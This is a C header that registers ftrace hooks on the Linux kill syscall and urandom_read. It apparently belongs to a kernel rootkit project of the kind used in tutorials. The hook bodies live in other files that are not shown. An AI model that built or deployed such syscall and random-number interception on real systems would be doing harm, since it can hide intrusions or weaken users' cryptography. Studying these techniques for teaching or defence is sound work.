#ifndef HOOKS_H
#define HOOKS_H

#include "ftrace_helper.h"

/* Include all hooks headers */
#include "sys_kill.h"
#include "hook_random.h"

/* ftrace hook descriptor array - use HOOK macro from ftrace_helper.h
 * _name argument to HOOK is a string literal (e.g. "sys_kill") so the macro
 * SYSCALL_NAME will transform it to "__x64_sys_kill" on x64-PTREGS stubs.
 */
static struct ftrace_hook hooked[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
    // HOOK_NOSYS("random_read", hook_random_read, &orig_random_read),
    HOOK_NOSYS("urandom_read", hook_urandom_read, &orig_urandom_read),

};
#endif /* HOOKS_H */